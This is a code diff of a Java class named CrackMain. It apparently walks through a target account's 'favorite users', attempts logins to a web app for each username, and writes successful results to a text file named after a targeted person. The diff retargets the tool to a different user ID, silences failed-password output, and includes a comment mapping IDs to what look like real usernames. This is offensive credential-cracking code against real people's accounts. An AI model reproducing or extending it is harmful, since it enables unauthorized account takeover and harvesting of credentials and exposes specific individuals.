@@ -14,12 +14,12 @@ import net.lqm.util.ReadFileUtil;
 public class CrackMain {
 	public static void main(String[] args) {
 		//61066=michlie;61271=柠檬爸爸;61010=wangjunling3
-		for(String userId : getFavoriteUsers("61536")) {
+		for(String userId : getFavoriteUsers("61010")) {
 			String name = getUserName(userId);
 			String str = loginWeApp(name);
 			if(str!=null) {
 				System.out.println(str);
-				ReadFileUtil.writeTxtFile("D:\\Documents\\we\\kittymm.txt", str);
+				ReadFileUtil.writeTxtFile("D:\\Documents\\we\\wangjunling.txt", str);
 			}
 		}
 	}
@@ -65,7 +65,7 @@ public class CrackMain {
 			map.get("content").get("token").toString();
 			return user;
 		} catch (Exception e) {
-			System.out.println("password is wrong： "+user);
+//			System.out.println("password is wrong： "+user);
 		}
 		return null;
 	}
